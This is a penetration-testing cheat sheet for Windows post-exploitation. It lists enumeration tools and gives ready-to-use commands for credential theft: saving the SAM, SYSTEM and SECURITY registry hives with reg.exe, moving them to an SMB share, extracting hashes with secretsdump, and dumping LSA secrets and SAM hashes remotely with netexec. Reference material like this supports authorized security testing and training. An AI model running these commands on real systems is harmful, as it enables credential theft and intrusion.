---
icon: windows
---

# Windows

#### Gather Info

```
> systeminfo
```

* [file-transfers.md](../post-exploitation/file-transfers.md "mention") winPEAS
* [http://fuzzysecurity.com/tutorials/16.html](http://fuzzysecurity.com/tutorials/16.html)
* [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://lolbas-project.github.io/](https://lolbas-project.github.io/)

```shellscript
net localgroup administrators
net user [username]
```

* [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)



### Password Attacks

#### Registry Hives

| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |

#### Using reg.exe to copy registry hives

This must be done with Admin privileges

{% code overflow="wrap" %}
```shellscript
# SAM
reg.exe save hklm\sam C:\sam.save
# SYSTEM
reg.exe save hklm\system C:\system.save
# SECURITY
reg.exe save hklm\security C:\security.save
```
{% endcode %}

Create an SMB share to transfer the files to your machine (impacket-smbserver)

Use move command to move files to SMB share

#### Using secretsdump to dump hashes

{% code overflow="wrap" %}
```bash
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
{% endcode %}

### **Dumping LSA secrets remotely**

We can sometimes dump LSA secrets with netexec:

```bash
nxc smb [target] --local-auth  -u [user] -p [pass] --lsa
```

You may also be able to do the same with the SAM

```bash
nxc smb [target] --local-auth  -u [user] -p [pass] --sam
```
